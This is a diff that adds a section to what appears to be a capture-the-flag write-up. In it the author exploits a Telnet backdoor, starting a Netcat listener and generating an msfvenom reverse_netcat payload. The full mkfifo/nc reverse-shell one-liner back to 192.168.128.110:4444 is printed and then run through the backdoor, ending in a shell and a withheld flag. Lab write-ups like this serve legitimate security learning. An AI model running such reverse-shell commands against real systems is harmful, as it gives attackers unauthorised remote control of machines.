@@ -271,3 +271,67 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 ### Interpretation
 
 The listener captured an ICMP echo request from the target to `192.168.128.110`, followed by an ICMP echo reply back to the target. That round trip confirmed the target could hear and respond to my machine through the backdoor path: the backdoor was not just a banner, it could execute a command and produce network traffic back to the listener.
+
+
+## 6. Reverse Shell via the Telnet Backdoor
+
+After confirming in Section 5 that the backdoor could execute commands and reach my machine, I used it to obtain a reverse shell.
+
+### Listener
+
+On my machine, I started a Netcat listener on port `4444`:
+
+```bash
+nc -lvnp 4444
+```
+
+```text
+listening on [any] 4444 ...
+```
+
+### Generating the Payload with msfvenom
+
+I used msfvenom to generate a reverse Netcat command pointing back to my listener address `192.168.128.110` on port `4444`:
+
+```bash
+msfvenom -p cmd/unix/reverse_netcat lhost=192.168.128.110 lport=4444 R
+```
+
+```text
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 93 bytes
+mkfifo /tmp/oyhn; nc 192.168.128.110 4444 0</tmp/oyhn | /bin/sh >/tmp/oyhn 2>&1; rm /tmp/oyhn
+```
+
+This payload works because it creates a named pipe, connects Netcat back to the listener, and pipes a shell through it, so input and output both flow over the same connection.
+
+### Running the Payload Through the Backdoor
+
+I reconnected to the backdoor on port `8012` and ran the payload with its `.RUN` command:
+
+```bash
+telnet <IP_ADDRESS> 8012
+```
+
+```text
+Trying <IP_ADDRESS>...
+Connected to <IP_ADDRESS>.
+Escape character is '^]'.
+SKIDY'S BACKDOOR. Type .HELP to view commands
+.RUN mkfifo /tmp/oyhn; nc 192.168.128.110 4444 0</tmp/oyhn | /bin/sh >/tmp/oyhn 2>&1; rm /tmp/oyhn
+```
+
+Note that only `.RUN` was used here; running `.HELP` itself is not recorded.
+
+### Shell Received
+
+The listener then showed an incoming connection from the target, giving me a shell:
+
+```text
+listening on [any] 4444 ...
+connect to [192.168.128.110] from (UNKNOWN) [<IP_ADDRESS>] 50562
+```
+
+Listing the directory showed `flag.txt` (alongside `snap`), and reading it with `cat flag.txt` gave the Telnet flag. The flag value is intentionally omitted from this write-up.
